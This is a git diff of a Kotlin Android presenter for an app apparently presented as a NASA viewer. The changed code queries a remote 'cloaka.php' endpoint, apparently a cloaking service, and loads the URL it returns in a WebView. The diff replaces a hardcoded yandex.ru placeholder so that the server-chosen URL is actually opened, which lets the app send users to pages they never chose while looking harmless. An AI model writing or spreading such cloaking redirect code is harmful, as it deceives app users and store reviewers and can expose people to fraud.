@@ -40,7 +40,8 @@ class MainActivityPresenter:MvpPresenter<NasaActivityView> ()
                     val phpResponse: ScriptPOJO? = response.body()
                     if (phpResponse != null) {
                         //viewState.addInView(phpResponse.asdf + phpResponse.qqqq)
-                        phpResponse.url="https://yandex.ru/"
+                        //phpResponse.url="https://yandex.ru/"
+                        Log.d("key",phpResponse.url.toString())
                         if (phpResponse.url!=null) {
                             sp.edit().putString(IS_NOT_FIRST,phpResponse.url).apply()
                             viewState.goInWebView(phpResponse.url.toString())
@@ -65,6 +66,8 @@ class MainActivityPresenter:MvpPresenter<NasaActivityView> ()
             val temp=doGet("http://platinum-kaz.ru/cloaka.php?id=2ottk6qvq3n63jec38t8")
             withContext(Dispatchers.Main){
             var answer= temp?.substringAfter("\"url\":\"")
+                answer = answer?.substring(0,answer.length - 2)
+                Log.i("jopa",answer)
             //answer=null //как будто url нет в скрипте
             if (answer.equals("null") || answer==null) {
                 sp.edit().putString(IS_NOT_FIRST, REG).apply()
@@ -72,7 +75,7 @@ class MainActivityPresenter:MvpPresenter<NasaActivityView> ()
             }
             else {
                 sp.edit().putString(IS_NOT_FIRST,answer).apply()
-                viewState.goInWebView("https://yandex.ru/") //костыль
+                viewState.goInWebView(answer.toString()) //костыль
 
             }
             }
